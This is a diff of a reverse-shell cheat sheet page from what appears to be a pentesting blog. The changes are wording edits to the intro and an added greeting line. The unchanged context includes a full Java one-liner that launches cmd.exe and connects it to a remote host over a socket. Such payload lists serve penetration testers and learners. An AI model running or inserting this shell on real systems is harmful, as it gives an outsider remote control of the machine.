@@ -4,7 +4,7 @@ title : 0xS3rGio - Reverse Shell The Ultimate Cheat Sheet
 ---
 ### Reverse Shell 
 
-A reverse shell is a kind of shell in which the target machine communicates back to the attacking machine,so during a Penetration Test If You’re Lucky Enough To Find A Command Execution Vulnerability You Will Probably Want An Interactive Shell.Here I include a reverse shell cheat sheet that contains many reverse shells for different methods or different programming languages like, PHP reverse shell, Netcat reverse shell, Python reverse shell, etc. 
+A reverse shell is a kind of shell in which the target machine communicates back to the attacking machine.During a Penetration Test If You’re Lucky Enough To Find A Command Execution Vulnerability You Will Probably Want An Interactive Shell Yes. Here I include a reverse shell cheat sheet that contains many reverse shells for different methods or different programming languages like, PHP reverse shell, Netcat reverse shell, Python reverse shell, etc. 
 
 Reverse Shell Cheat Sheet
 
@@ -65,6 +65,7 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
+Greeting From [Sergio](https://twitter.com/x0Sergi)
 <br> <br>
 [Back To Home](../index.md)
 <br>
